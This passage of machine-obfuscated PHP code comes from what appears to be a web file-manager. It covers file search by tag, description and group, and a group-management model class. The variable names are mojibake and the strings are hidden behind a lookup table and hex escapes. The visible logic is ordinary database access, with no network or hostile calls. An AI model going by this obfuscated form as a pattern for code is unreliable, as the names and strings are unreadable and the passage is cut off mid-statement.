$õóÀ“ù·[$­›­õó[467]] = array($­›­õó[7], $«äá×Óà[$­›­õó[467]]); unset($õóÀ“ù·[$­›­õó[32]]); unset($«äá×Óà[$­›­õó[467]]); $Äìø±ïƒ = $this->field($§û€´¹)->where($õóÀ“ù·)->limit($­›­õó[2066])->select(); if (!$Äìø±ïƒ || count($Äìø±ïƒ) == 0) { return; } $ä»¥ŒÃÙ[$­›­õó[364]] = array_merge($Äìø±ïƒ, $ä»¥ŒÃÙ[$­›­õó[364]]); $ä»¥ŒÃÙ[$­›­õó[361]][$­›­õó[362]] += count($Äìø±ïƒ); } private function _listSearchTag(&$ùòô¥ÕÀ, $ëÅÂÌÔ, $£¾–¶½¥) { $Ê‹òÖßÙ =& $_SERVER[Ãìšã«™]; if (!$ëÅÂÌÔ[$Ê‹òÖßÙ[1909]] || $ùòô¥ÕÀ[$Ê‹òÖßÙ[361]][$Ê‹òÖßÙ[348]] > 1) { return; } $†¸™œßµ = Model($Ê‹òÖßÙ[2067])->listData(); $­°éµŸ = array(); $­ “å³ß = $ëÅÂÌÔ[$Ê‹òÖßÙ[1909]]; foreach ($†¸™œßµ as $íæŒÄ¨Š) { $À¨©œÈƒ = $íæŒÄ¨Š[$Ê‹òÖßÙ[32]]; $ŸçãıÏà = str_replace($Ê‹òÖßÙ[53], $Ê‹òÖßÙ[12], Pinyin::get($À¨©œÈƒ)); if (stripos($À¨©œÈƒ, $­ “å³ß) !== !1 || stripos($ŸçãıÏà, $­ “å³ß) !== !1) { $­°éµŸ[] = $íæŒÄ¨Š[$Ê‹òÖßÙ[392]]; } } if (!$­°éµŸ) { return; } $ºï‡Í¼¥ = array($Ê‹òÖßÙ[427] => array($Ê‹òÖßÙ[7], $­°éµŸ), $Ê‹òÖßÙ[1650] => USER_ID); $ıøµ¸†Ê = Model($Ê‹òÖßÙ[428])->field($Ê‹òÖßÙ[78])->where($ºï‡Í¼¥)->select(); $ıøµ¸†Ê = array_to_keyvalue($ıøµ¸†Ê, $Ê‹òÖßÙ[12], $Ê‹òÖßÙ[78]); $ªèéù¼Â = array_unique($ıøµ¸†Ê); $this->_listSearchMerge($ùòô¥ÕÀ, $ëÅÂÌÔ, $£¾–¶½¥, $ªèéù¼Â); } private function _listSearchDesc(&$Í¡™¿şÈ, $­Û™Íí½, $¾¡Œ™†) { $Ÿ¿×¢¤ş =& $_SERVER[Ãìšã«™]; if (!$­Û™Íí½[$Ÿ¿×¢¤ş[1909]] || $Í¡™¿şÈ[$Ÿ¿×¢¤ş[361]][$Ÿ¿×¢¤ş[348]] > 1) { return; } $ê’¶èš… = $this->listSearchChildren($­Û™Íí½[$Ÿ¿×¢¤ş[498]]); $ê’¶èš… = array_unique($ê’¶èš…); if (!$ê’¶èš…) { return; } $ÑšµšÊ = array($Ÿ¿×¢¤ş[403] => array($Ÿ¿×¢¤ş[7], $ê’¶èš…), $Ÿ¿×¢¤ş[95] => $Ÿ¿×¢¤ş[451], $Ÿ¿×¢¤ş[369] => array($Ÿ¿×¢¤ş[378], $Ÿ¿×¢¤ş[1911] . $­Û™Íí½[$Ÿ¿×¢¤ş[1909]] . $Ÿ¿×¢¤ş[1911])); $ú‡ËÓÆ¯ = Model($Ÿ¿×¢¤ş[563])->field($Ÿ¿×¢¤ş[403])->where($ÑšµšÊ)->select(); $ÄÊ‰Ïœ = array_to_keyvalue($ú‡ËÓÆ¯, $Ÿ¿×¢¤ş[12], $Ÿ¿×¢¤ş[403]); $this->_listSearchMerge($Í¡™¿şÈ, $­Û™Íí½, $¾¡Œ™†, $ÄÊ‰Ïœ); } private function _listSearchGroupTag(&$±ÖÜçï, $íÌ“èÒõ, $ö¼‘×“ò) { $Ç°ÑÏÖ =& $_SERVER[Ãìšã«™]; if (!$íÌ“èÒõ[$Ç°ÑÏÖ[1909]] || $±ÖÜçï[$Ç°ÑÏÖ[361]][$Ç°ÑÏÖ[348]] > 1 || !$íÌ“èÒõ[$Ç°ÑÏÖ[498]]) { return; } $€úˆºÈ© = $this->sourceInfo($íÌ“èÒõ[$Ç°ÑÏÖ[498]]); if (!$€úˆºÈ© || $€úˆºÈ©[$Ç°ÑÏÖ[412]] != SourceModel::TYPE_GROUP) { return; } $¦ÎŸø»Ç = $€úˆºÈ©[$Ç°ÑÏÖ[504]]; $©ç¡î = Model($Ç°ÑÏÖ[2068])->get($¦ÎŸø»Ç); $–üçŒûİ = array(); $‡®ìÖ¼ = $íÌ“èÒõ[$Ç°ÑÏÖ[1909]]; foreach ($©ç¡î[$Ç°ÑÏÖ[364]] as $…ºœñóá) { $øš±Ò = $…ºœñóá[$Ç°ÑÏÖ[32]]; $á¡ÙêÆ = str_replace($Ç°ÑÏÖ[53], $Ç°ÑÏÖ[12], Pinyin::get($øš±Ò)); if (stripos($øš±Ò, $‡®ìÖ¼) !== !1 || stripos($á¡ÙêÆ, $‡®ìÖ¼) !== !1) { $–üçŒûİ[] = $…ºœñóá[$Ç°ÑÏÖ[392]]; } } if (!$–üçŒûİ) { return; } $ê‹ı¦…ô = array($Ç°ÑÏÖ[427] => array($Ç°ÑÏÖ[7], $–üçŒûİ), $Ç°ÑÏÖ[1650] => 0, $Ç°ÑÏÖ[33] => $Ç°ÑÏÖ[1931] . $¦ÎŸø»Ç); $Í“ö¬µ“ = Model($Ç°ÑÏÖ[428])->field($Ç°ÑÏÖ[78])->where($ê‹ı¦…ô)->select(); $Í“ö¬µ“ = array_to_keyvalue($Í“ö¬µ“, $Ç°ÑÏÖ[12], $Ç°ÑÏÖ[78]); $ÁÊÌü¼£ = array_unique($Í“ö¬µ“); $this->_listSearchMerge($±ÖÜçï, $íÌ“èÒõ, $ö¼‘×“ò, $ÁÊÌü¼£); } private function _listSearchMerge(&$ÏÆİ Ø°, $›³ö£«, $©¥³îß, $ü…õ¤¨Î) { $¬ñ¬¹ =& $_SERVER[Ãìšã«™]; if (!$ü…õ¤¨Î) { return; } $˜ÍÍàõ = array_to_keyvalue($ÏÆİ Ø°[$¬ñ¬¹[364]], $¬ñ¬¹[12], $¬ñ¬¹[403]); $·Š‰Çä = array_diff($ü…õ¤¨Î, $˜ÍÍàõ); if (!$·Š‰Çä) { return; } $Á‡·úŸ = array($¬ñ¬¹[403] => array($¬ñ¬¹[7], $·Š‰Çä)); $ê°¦££« = $this->field($©¥³îß)->where($Á‡·úŸ)->select(); if (!$ê°¦££«) { return; } $«ß¦Ñ¥ = array(); foreach ($ê°¦££« as $Æºñ€äà) { if ($this->_listSearchFilter($Æºñ€äà, $›³ö£«)) { $«ß¦Ñ¥[] = $Æºñ€äà; } } $ÏÆİ Ø°[$¬ñ¬¹[364]] = array_merge($«ß¦Ñ¥, $ÏÆİ Ø°[$¬ñ¬¹[364]]); $ÏÆİ Ø°[$¬ñ¬¹[361]][$¬ñ¬¹[362]] += count($«ß¦Ñ¥); } private function _listSearchFilter($çù“šØ, $ÖÚ„Ÿ·ˆ) { $ŸşÉ¼¤Ì =& $_SERVER[Ãìšã«™]; $ö°ˆ—İ¨ = $çù“šØ[$ŸşÉ¼¤Ì[411]] == $ŸşÉ¼¤Ì[89]; if (!strstr($çù“šØ[$ŸşÉ¼¤Ì[521]], $ŸşÉ¼¤Ì[50] . $ÖÚ„Ÿ·ˆ[$ŸşÉ¼¤Ì[498]] . $ŸşÉ¼¤Ì[50])) { return !1; } if (isset($ÖÚ„Ÿ·ˆ[$ŸşÉ¼¤Ì[413]]) && $ÖÚ„Ÿ·ˆ[$ŸşÉ¼¤Ì[413]] != $ŸşÉ¼¤Ì[1872]) { if ($ÖÚ„Ÿ·ˆ[$ŸşÉ¼¤Ì[413]] == $ŸşÉ¼¤Ì[79] && !$ö°ˆ—İ¨) { return !1; } if ($ÖÚ„Ÿ·ˆ[$ŸşÉ¼¤Ì[413]] != $ŸşÉ¼¤Ì[79] && $ö°ˆ—İ¨) { return !1; } if (!strstr($çù“šØ[$ŸşÉ¼¤Ì[167]], $ŸşÉ¼¤Ì[50] . $ÖÚ„Ÿ·ˆ[$ŸşÉ¼¤Ì[413]] . $ŸşÉ¼¤Ì[50])) { return !1; } } if (isset($ÖÚ„Ÿ·ˆ[$ŸşÉ¼¤Ì[2069]]) && $ÖÚ„Ÿ·ˆ[$ŸşÉ¼¤Ì[2069]] < $çù“šØ[$ŸşÉ¼¤Ì[80]]) { return !1; } if (isset($ÖÚ„Ÿ·ˆ[$ŸşÉ¼¤Ì[2070]]) && $ÖÚ„Ÿ·ˆ[$ŸşÉ¼¤Ì[2070]] > $çù“šØ[$ŸşÉ¼¤Ì[80]]) { return !1; } if (isset($ÖÚ„Ÿ·ˆ[$ŸşÉ¼¤Ì[594]]) && $ÖÚ„Ÿ·ˆ[$ŸşÉ¼¤Ì[594]] != $çù“šØ[$ŸşÉ¼¤Ì[454]]) { return !1; } return !0; } public function listSearchChildren($ƒšˆµ, $¿ù‡õëì = 5000) { $¬üĞÔØâ =& $_SERVER[Ãìšã«™]; $µøÛÇª = array(); $¸›Èı¾ç = $this->sourceInfo($ƒšˆµ); $ù•©’½© = array($¬üĞÔØâ[521] => array($¬üĞÔØâ[378], $¸›Èı¾ç[$¬üĞÔØâ[521]] . $¸›Èı¾ç[$¬üĞÔØâ[403]] . $¬üĞÔØâ[545])); $Ì¼ğêÛ = $this->field($¬üĞÔØâ[80])->where($ù•©’½©)->limit($¿ù‡õëì + 1)->select(); $à¢ç¹† = is_array($Ì¼ğêÛ) ? count($Ì¼ğêÛ) : 0; if ($à¢ç¹† > $¿ù‡õëì) { return $this->_listSearchChildrenNear($ƒšˆµ, $¿ù‡õëì); } $½å˜¦Ã¤ = $this->field($¬üĞÔØâ[403])->where($ù•©’½©)->select(); $µøÛÇª = array_to_keyvalue($½å˜¦Ã¤, $¬üĞÔØâ[12], $¬üĞÔØâ[403]); return $µøÛÇª; } private function _listSearchChildrenNear($’™€‘›, $¦¬†ïÙõ) { $°‹§Ñ  =& $_SERVER[Ãìšã«™]; $…Ü¢İï = array(); $ÆÓå»º = array($°‹§Ñ [498] => $’™€‘›); $¾·²µè¿ = $this->field($°‹§Ñ [2071])->where($ÆÓå»º)->select(); $ã°âÍ¾í = array_to_keyvalue(array_filter_by_field($¾·²µè¿, $°‹§Ñ [411], $°‹§Ñ [89]), $°‹§Ñ [12], $°‹§Ñ [403]); $…Ü¢İï = array_merge($…Ü¢İï, array_to_keyvalue($¾·²µè¿, $°‹§Ñ [12], $°‹§Ñ [403])); if (!$ã°âÍ¾í) { return $…Ü¢İï; } $ÆÓå»º = array($°‹§Ñ [498] => array($°‹§Ñ [7], $ã°âÍ¾í)); $¾·²µè¿ = $this->field($°‹§Ñ [2071])->where($ÆÓå»º)->limit($¦¬†ïÙõ)->select(); $…Ü¢İï = array_merge($…Ü¢İï, array_to_keyvalue($¾·²µè¿, $°‹§Ñ [12], $°‹§Ñ [403])); $…Ü¢İï = array_slice($…Ü¢İï, 0, $¦¬†ïÙõ); return $…Ü¢İï; } private function _listSearchBindPinyin($¨…¥Ò–, &$óÆÃ±¾¸, &$îéŞ—½) { $ãê¿ñŸõ =& $_SERVER[Ãìšã«™]; if (!isset($¨…¥Ò–[$ãê¿ñŸõ[1909]]) || !$¨…¥Ò–[$ãê¿ñŸõ[1909]]) { return; } if (!Input::check($¨…¥Ò–[$ãê¿ñŸõ[1909]], $ãê¿ñŸõ[313]) || strlen($¨…¥Ò–[$ãê¿ñŸõ[1909]]) < 2) { return; } $˜”ğ­¶ = "\114\x45\x46\x54\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\x69\157\137\163\157\165\162\143\145\137\x6d\145\x74\x61\40\x6d\x65\x74\141\x20\157\x6e\40\x73\x6f\x75\162\143\x65\56\x73\x6f\x75\x72\143\x65\111\x44\x20\75\40\x6d\145\164\141\x2e\x73\157\165\162\x63\x65\111\104"; $’÷œÍ“Â = array(); $îéŞ—½ = str_replace(array($ãê¿ñŸõ[226], $ãê¿ñŸõ[53], $ãê¿ñŸõ[2072]), $ãê¿ñŸõ[12], $îéŞ—½); $îéŞ—½ = $ãê¿ñŸõ[436] . str_replace($ãê¿ñŸõ[50], $ãê¿ñŸõ[437], $îéŞ—½); $øÇÁÕÀ² = $óÆÃ±¾¸[$ãê¿ñŸõ[32]]; unset($óÆÃ±¾¸[$ãê¿ñŸõ[32]]); foreach ($óÆÃ±¾¸ as $êŞ©ª˜‘ => $Ìë÷ŒüÈ) { $’÷œÍ“Â[$ãê¿ñŸõ[436] . $êŞ©ª˜‘] = $Ìë÷ŒüÈ; } foreach ($øÇÁÕÀ² as $çì‚ŠÔ) { $’÷œÍ“Â[] = array($ãê¿ñŸõ[441] => $çì‚ŠÔ, $ãê¿ñŸõ[996] => $ãê¿ñŸõ[1913], array($ãê¿ñŸõ[2073] => $çì‚ŠÔ, $ãê¿ñŸõ[2074] => array($ãê¿ñŸõ[7], array($ãê¿ñŸõ[464], $ãê¿ñŸõ[463])))); } $this->join($˜”ğ­¶); $óÆÃ±¾¸ = $’÷œÍ“Â; } private function _parseSearchWhere($„äú‰…Ğ) { $çÍ©àÃ =& $_SERVER[Ãìšã«™]; $ªø¡ÛĞ = array(); if (isset($„äú‰…Ğ[$çÍ©àÃ[762]]) && $„äú‰…Ğ[$çÍ©àÃ[762]]) { $ªø¡ÛĞ[$çÍ©àÃ[86]] = array($çÍ©àÃ[2075], $„äú‰…Ğ[$çÍ©àÃ[762]]); } if (isset($„äú‰…Ğ[$çÍ©àÃ[496]]) && $„äú‰…Ğ[$çÍ©àÃ[496]]) { $ÌæÕËÍ· = array($çÍ©àÃ[2076], $„äú‰…Ğ[$çÍ©àÃ[496]]); if ($ªø¡ÛĞ[$çÍ©àÃ[86]]) { $ªø¡ÛĞ[$çÍ©àÃ[86]] = array($ªø¡ÛĞ[$çÍ©àÃ[86]], $ÌæÕËÍ·, $çÍ©àÃ[2077]); } else { $ªø¡ÛĞ[$çÍ©àÃ[86]] = $ÌæÕËÍ·; } } if (isset($„äú‰…Ğ[$çÍ©àÃ[2069]]) && $„äú‰…Ğ[$çÍ©àÃ[2069]] > 0) { $ªø¡ÛĞ[$çÍ©àÃ[80]] = array($çÍ©àÃ[2075], $„äú‰…Ğ[$çÍ©àÃ[2069]]); } if (isset($„äú‰…Ğ[$çÍ©àÃ[2070]]) && $„äú‰…Ğ[$çÍ©àÃ[2070]]) { $ÌæÕËÍ· = array($çÍ©àÃ[2076], $„äú‰…Ğ[$çÍ©àÃ[2070]]); if ($ªø¡ÛĞ[$çÍ©àÃ[80]]) { $ªø¡ÛĞ[$çÍ©àÃ[80]] = array($ªø¡ÛĞ[$çÍ©àÃ[80]], $ÌæÕËÍ·, $çÍ©àÃ[2077]); } else { $ªø¡ÛĞ[$çÍ©àÃ[80]] = $ÌæÕËÍ·; } } if (isset($„äú‰…Ğ[$çÍ©àÃ[594]]) && $„äú‰…Ğ[$çÍ©àÃ[594]]) { $ªø¡ÛĞ[] = array($çÍ©àÃ[454] => $„äú‰…Ğ[$çÍ©àÃ[594]], $çÍ©àÃ[452] => $„äú‰…Ğ[$çÍ©àÃ[594]], $çÍ©àÃ[996] => $çÍ©àÃ[1913]); } if (isset($„äú‰…Ğ[$çÍ©àÃ[413]]) && $„äú‰…Ğ[$çÍ©àÃ[413]]) { $ÙãçÜåĞ = $„äú‰…Ğ[$çÍ©àÃ[413]]; if ($ÙãçÜåĞ == $çÍ©àÃ[79]) { $ªø¡ÛĞ[$çÍ©àÃ[411]] = 1; } else { if ($ÙãçÜåĞ == $çÍ©àÃ[2078]) { $ªø¡ÛĞ[$çÍ©àÃ[411]] = 0; } else { if ($ÙãçÜåĞ) { $ÙãçÜåĞ = is_array($ÙãçÜåĞ) ? $ÙãçÜåĞ : explode($çÍ©àÃ[50], $ÙãçÜåĞ); $ªø¡ÛĞ[$çÍ©àÃ[413]] = array($çÍ©àÃ[419], $ÙãçÜåĞ); $ªø¡ÛĞ[$çÍ©àÃ[411]] = 0; } } } } $this->_parseSearchParent($„äú‰…Ğ, $ªø¡ÛĞ); if (isset($„äú‰…Ğ[$çÍ©àÃ[1909]]) && trim($„äú‰…Ğ[$çÍ©àÃ[1909]])) { $Ç„œîß° = trim($„äú‰…Ğ[$çÍ©àÃ[1909]]); $ÃÔÈúŒŠ = explode($çÍ©àÃ[53], $Ç„œîß°); if (strlen($Ç„œîß°) > 2 && (substr($Ç„œîß°, 0, 1) == $çÍ©àÃ[117] && substr($Ç„œîß°, -1) == $çÍ©àÃ[117]) || substr($Ç„œîß°, 0, 1) == $çÍ©àÃ[58] && substr($Ç„œîß°, -1) == $çÍ©àÃ[58]) { $Ç„œîß° = substr($Ç„œîß°, 1, -1); $ÃÔÈúŒŠ = array($Ç„œîß°); } $ªø¡ÛĞ[$çÍ©àÃ[32]] = array(array($çÍ©àÃ[544], $çÍ©àÃ[1911] . $Ç„œîß° . $çÍ©àÃ[1911])); if (count($ÃÔÈúŒŠ) > 1) { $ªø¡ÛĞ[$çÍ©àÃ[32]] = array(); foreach ($ÃÔÈúŒŠ as $†ö®ØÒå) { if (!trim($†ö®ØÒå)) { continue; } $ªø¡ÛĞ[$çÍ©àÃ[32]][] = array($çÍ©àÃ[544], $çÍ©àÃ[1911] . trim($†ö®ØÒå) . $çÍ©àÃ[1911]); } } } return $ªø¡ÛĞ; } private function _parseSearchParent($¥¢ûÜÒõ, &$äı“ˆ·¤) { $“ãšşêù =& $_SERVER[Ãìšã«™]; if (!isset($¥¢ûÜÒõ[$“ãšşêù[498]]) || !$¥¢ûÜÒõ[$“ãšşêù[498]]) { return; } $²÷Úû = $this->pathInfo($¥¢ûÜÒõ[$“ãšşêù[498]]); $ï¢ÑºŒÌ = $²÷Úû[$“ãšşêù[498]] . $“ãšşêù[12] === $“ãšşêù[190]; $—èéé¦Æ = $²÷Úû[$“ãšşêù[412]] == $“ãšşêù[515]; $äı“ˆ·¤[$“ãšşêù[584]] = array($“ãšşêù[544], $²÷Úû[$“ãšşêù[521]] . $¥¢ûÜÒõ[$“ãšşêù[498]] . $“ãšşêù[545]); $«¯â­£¾ = isset($¥¢ûÜÒõ[$“ãšşêù[1777]]) && in_array($“ãšşêù[515], $¥¢ûÜÒõ[$“ãšşêù[1777]]); if (!$«¯â­£¾ || !$—èéé¦Æ || !$ï¢ÑºŒÌ || !$²÷Úû[$“ãšşêù[414]]) { return; } if (!AuthModel::authCheckRoot($²÷Úû[$“ãšşêù[414]][$“ãšşêù[415]])) { return; } $©‚¥ß…œ = $²÷Úû[$“ãšşêù[504]] . $“ãšşêù[12]; if ($©‚¥ß…œ == $“ãšşêù[89]) { unset($äı“ˆ·¤[$“ãšşêù[584]]); $äı“ˆ·¤[$“ãšşêù[412]] = self::TYPE_GROUP; return; } $àãôÜ²› = Model($“ãšşêù[522])->groupChildrenAll($©‚¥ß…œ); $š·ïùŠ„ = count($àãôÜ²›); if ($š·ïùŠ„ <= 1) { return; } $‹éËŠ¿€ = array($“ãšşêù[498] => 0, $“ãšşêù[412] => self::TYPE_GROUP, $“ãšşêù[504] => array($“ãšşêù[7], $àãôÜ²›)); $”„ŸÄ±İ = $this->field($“ãšşêù[2079])->where($‹éËŠ¿€)->limit($š·ïùŠ„)->select(); $äı“ˆ·¤[$“ãšşêù[584]] = array(); foreach ($”„ŸÄ±İ as $¿‰‚†ãÀ) { $äı“ˆ·¤[$“ãšşêù[584]][] = array($“ãšşêù[544], $“ãšşêù[531] . $¿‰‚†ãÀ[$“ãšşêù[403]] . $“ãšşêù[545]); } $äı“ˆ·¤[$“ãšşêù[584]][] = $“ãšşêù[1913]; } } goto C±í·›òÆ; aÑâ©¨Ş¾Ú: class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\x70"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\141\x6d\x65" => "\x67\x72\157\165\x70\x5f\155\145\164\x61", "\x6d\145\164\141\x46\151\145\154\x64" => "\147\x72\157\165\x70\x49\104"); protected function cacheFunctionAlias($»‡æŸøı) { $Ş©øÜıß =& $_SERVER[Ãìšã«™]; return array($Ş©øÜıß[1895] => array($»‡æŸøı[0], $Ş©øÜıß[1896]), $Ş©øÜıß[1897] => array($»‡æŸøı[0], $Ş©øÜıß[1898])); } protected function getInfo($«ÂÃõ±ß, $Àõµ‰ñÌ = false) { $•ÎªÅˆğ = $this->getInfoSimple($«ÂÃõ±ß); if (!$•ÎªÅˆğ) { return !1; } if ($Àõµ‰ñÌ) { return $this->_listDataApplyItem($•ÎªÅˆğ); } return $this->cacheFunctionGet($_SERVER[Ãìšã«™][1899], $«ÂÃõ±ß); } protected function getInfoSimple($ø¬³æ­Ô, $­œÆ·²° = false) { $‰¶ ãÃ =& $_SERVER[Ãìšã«™]; if ($­œÆ·²°) { $Åı¢œòĞ = array($‰¶ ãÃ[1818] => intval($ø¬³æ­Ô)); $ì¦×ŒÁš = $this->where($Åı¢œòĞ)->find(); return is_array($ì¦×ŒÁš) ? $ì¦×ŒÁš : array(); } return $this->cacheFunctionGet($‰¶ ãÃ[1900], $ø¬³æ­Ô); } protected function groupAdd($Ğê–è¦Ã) { $·Ïå‚ =& $_SERVER[Ãìšã«™]; if (!$Ğê–è¦Ã[$·Ïå‚[498]] && isset($Ğê–è¦Ã[$·Ïå‚[1818]]) && $Ğê–è¦Ã[$·Ïå‚[1818]] == 1) { if ($¡İ‡ö˜ = $this->getInfoSimple($Ğê–è¦Ã[$·Ïå‚[1818]], !0)) { return $Ğê–è¦Ã[$·Ïå‚[1818]]; } } else { $¡İ‡ö˜ = $this->getInfoSimple($Ğê–è¦Ã[$·Ïå‚[498]]); if (!$¡İ‡ö˜) { return !1; } } $ÂÇ––öú = $·Ïå‚[531]; if ($¡İ‡ö˜[$·Ïå‚[521]]) { $ÂÇ––öú = $¡İ‡ö˜[$·Ïå‚[521]] . $¡İ‡ö˜[$·Ïå‚[1818]] . $·Ïå‚[50]; } $ªÁ§ŸÚ÷ = array($·Ïå‚[421] => $this->groupNameAuto($Ğê–è¦Ã[$·Ïå‚[498]], $Ğê–è¦Ã[$·Ïå‚[32]]), $·Ïå‚[402] => $Ğê–è¦Ã[$·Ïå‚[498]], $·Ïå‚[584] => $ÂÇ––öú, $·Ïå‚[1901] => $Ğê–è¦Ã[$·Ïå‚[1805]], $·Ïå‚[1902] => 0, $·Ïå‚[1822] => 0); if (isset($Ğê–è¦Ã[$·Ïå‚[1841]])) { $ªÁ§ŸÚ÷[$·Ïå‚[1841]] = $Ğê–è¦Ã[$·Ïå‚[1841]]; } else { $€±Ñ¼Ïş = $this->max($·Ïå‚[1841]); if (!$€±Ñ¼Ïş) { $€±Ñ¼Ïş = 0; } $ªÁ§ŸÚ÷[$·Ïå‚[1841]] = $€±Ñ¼Ïş + 1; } if (!empty($Ğê–è¦Ã[$·Ïå‚[1818]])) { $ªÁ§ŸÚ÷[$·Ïå‚[1818]] = $Ğê–è¦Ã[$·Ïå‚[1818]]; } $Éíº¨ªÁ = $this->add($ªÁ§ŸÚ÷); $this->setNamePinyin($Éíº¨ªÁ, $ªÁ§ŸÚ÷[$·Ïå‚[32]]); if (isset($Ğê–è¦Ã[$·Ïå‚[1903]])) { $this->metaSet($Éíº¨ªÁ, array($·Ïå‚[1903] => $Ğê–è¦Ã[$·Ïå‚[1903]], $·Ïå‚[1904] => $Ğê–è¦Ã[$·Ïå‚[1904]])); unset($Ğê–è¦Ã[$·Ïå‚[1903]]); unset($Ğê–è¦Ã[$·Ïå‚[1904]]); } Model($·Ïå‚[1321])->groupRootAdd($Éíº¨ªÁ); return $Éíº¨ªÁ; } protected function groupEdit($”ºšà±¢, $ãÓ¶ùœÎ) { $§ëÌ”Ëê =& $_SERVER[Ãìšã«™]; $ññË›Œ§ = $this->getInfoSimple($”ºšà±¢); if (!$ññË›Œ§) { return !1; } if (!empty($ãÓ¶ùœÎ[$§ëÌ”Ëê[498]])) { $¢ëöé÷ä = $this->getInfoSimple($ãÓ¶ùœÎ[$§ëÌ”Ëê[498]]); if (!$¢ëöé÷ä) { return !1; } if ($ññË›Œ§[$§ëÌ”Ëê[1818]] == $¢ëöé÷ä[$§ëÌ”Ëê[1818]]) { return !1; } if ($ãÓ¶ùœÎ[$§ëÌ”Ëê[498]] != $ññË›Œ§[$§ëÌ”Ëê[498]]) { if ($¢ëöé÷ä[$§ëÌ”Ëê[521]] !== $ññË›Œ§[$§ëÌ”Ëê[521]] && strpos($¢ëöé÷ä[$§ëÌ”Ëê[521]], $ññË›Œ§[$§ëÌ”Ëê[521]] . $ññË›Œ§[$§ëÌ”Ëê[1818]] . $§ëÌ”Ëê[50]) === 0) { return !1; } $ãÓ¶ùœÎ[$§ëÌ”Ëê[584]] = $¢ëöé÷ä[$§ëÌ”Ëê[521]] . $ãÓ¶ùœÎ[$§ëÌ”Ëê[498]] . $§ëÌ”Ëê[50]; $this->_changeChildLevel($ññË›Œ§, $¢ëöé÷ä); } } if (isset($ãÓ¶ùœÎ[$§ëÌ”Ëê[32]])) { $this->setNamePinyin($”ºšà±¢, $ãÓ¶ùœÎ[$§ëÌ”Ëê[32]]); } if (isset($ãÓ¶ùœÎ[$§ëÌ”Ëê[1903]])) { $this->metaSet($”ºšà±¢, array($§ëÌ”Ëê[1903] => $ãÓ¶ùœÎ[$§ëÌ”Ëê[1903]], $§ëÌ”Ëê[1904] => $ãÓ¶ùœÎ[$§ëÌ”Ëê[1904]])); unset($ãÓ¶ùœÎ[$§ëÌ”Ëê[1903]]); unset($ãÓ¶ùœÎ[$§ëÌ”Ëê[1904]]); } $this->_clearChildrenCache($ññË›Œ§); return $this->where(array($§ëÌ”Ëê[1905] => $”ºšà±¢))->save($ãÓ¶ùœÎ); } private function _clearChildrenCache($ïãÉç›) { $°óÃÉ­ï =& $_SERVER[Ãìšã«™]; $º€ÉÍÕÙ = array($°óÃÉ­ï[584] => array($°óÃÉ­ï[544], $ïãÉç›[$°óÃÉ­ï[521]] . $ïãÉç›[$°óÃÉ­ï[1818]] . $°óÃÉ­ï[545])); $ÓØ¡³·É = $this->field($°óÃÉ­ï[1818])->where($º€ÉÍÕÙ)->select(); foreach ($ÓØ¡³·É as $¨à÷ÏÌ¡) { $this->_clearCache($¨à÷ÏÌ¡[$°óÃÉ­ï[1818]]); } } private function _clearCache($–ø•áá) { $±¦İúƒî =& $_SERVER[Ãìšã«™]; $this->cacheFunctionClear($±¦İúƒî[1899], $–ø•áá); $this->cacheFunctionClear($±¦İúƒî[1900], $–ø•áá); } private function _changeChildLevel($’ÜÚÎó, $¯§œÚ », $ñãß»¹® = false) { $Š©ö =& $_SERVER[Ãìšã«™]; $«üí™á¸ = $’ÜÚÎó[$Š©ö[521]] . $’ÜÚÎó[$Š©ö[1818]] . $Š©ö[50]; $ª“ïƒè = $¯§œÚ »[$Š©ö[521]] . $¯§œÚ »[$Š©ö[1818]] . $Š©ö[50] . $’ÜÚÎó[$Š©ö[1818]] . $Š©ö[50]; if ($ñãß»¹®) { $ª“ïƒè = $¯§œÚ »[$Š©ö[521]] . $¯§œÚ »[$Š©ö[1818]] . $Š©ö[50]; } $é®ÖîÔ¢ = array($Š©ö[584] => array($Š©ö[544], $’ÜÚÎó[$Š©ö[521]] . $’ÜÚÎó[$Š©ö[1818]] . $Š©ö[545])); $Ïİñâ = array($Š©ö[584] => array($Š©ö[593], "\162\145\x70\x6c\141\143\145\50\160\141\162\x65\156\x74\114\145\166\145\154\54\47{$«üí™á¸}\x27\54\47{$ª“ïƒè}\x27\51")); $this->_clearChildrenCache($’ÜÚÎó); $this->where($é®ÖîÔ¢)->data($Ïİñâ)->save(); } public function setNamePinyin($Ç­¿¾•â, $–æ‡ë¢ = false) { $¿­…øà‘ =& $_SERVER[Ãìšã«™]; if (!$–æ‡ë¢) { $åÑá¹Ÿç = $this->getInfoSimple($Ç­¿¾•â); $–æ‡ë¢ = $åÑá¹Ÿç[$¿­…øà‘[32]]; } if (!Input::check($–æ‡ë¢, $¿­…øà‘[587])) { $this->metaSet($Ç­¿¾•â, $¿­…øà‘[464], null); $this->metaSet($Ç­¿¾•â, $¿­…øà‘[463], null); return; } $Ş½øĞÂ = array($¿­…øà‘[464] => str_replace($¿­…øà‘[53], $¿­…øà‘[12], Pinyin::get($–æ‡ë¢)), $¿­…øà‘[463] => Pinyin::get($–æ‡ë¢, $¿­…øà‘[588])); $this->metaSet($Ç­¿¾•â, $Ş½øĞÂ); } protected function groupStatus($¶€ãìôœ, $ñ©¯áÒ) { $¼õÖ€ç• =& $_SERVER[Ãìšã«™]; $Ï­²æ ´ = $this->getInfoSimple($¶€ãìôœ); if (!$Ï­²æ ´) { return !1; } if ($ñ©¯áÒ == $¼õÖ€ç•[89]) { $˜°œœ“± = $this->parentLevelArray($Ï­²æ ´[$¼õÖ€ç•[521]]); } else { $Éù¥ğÑâ = array($¼õÖ€ç•[584] => array($¼õÖ€ç•[544], $Ï­²æ ´[$¼õÖ€ç•[521]] . $Ï­²æ ´[$¼õÖ€ç•[1818]] . $¼õÖ€ç•[545])); $˜°œœ“± = $this->where($Éù¥ğÑâ)->field($¼õÖ€ç•[1818])->select(); $˜°œœ“± = array_to_keyvalue($˜°œœ“±, $¼õÖ€ç•[12], $¼õÖ€ç•[1818]); } $˜°œœ“±[] = $Ï­²æ ´[$¼õÖ€ç•[1818]]; $ÌÃöÚº© = array(); foreach ($˜°œœ“± as $¶€ãìôœ) { $ÌÃöÚº©[] = array($¼õÖ€ç•[1818] => $¶€ãìôœ, $¼õÖ€ç•[95] => $¼õÖ€ç•[751], $¼õÖ€ç•[369] => $ñ©¯áÒ); $this->_clearCache($¶€ãìôœ); } return Model($¼õÖ€ç•[1906])->addAll($ÌÃöÚº©, array(), !0); } protected function groupRemove($ö¶§í½) { $½â›ÁúÀ =& 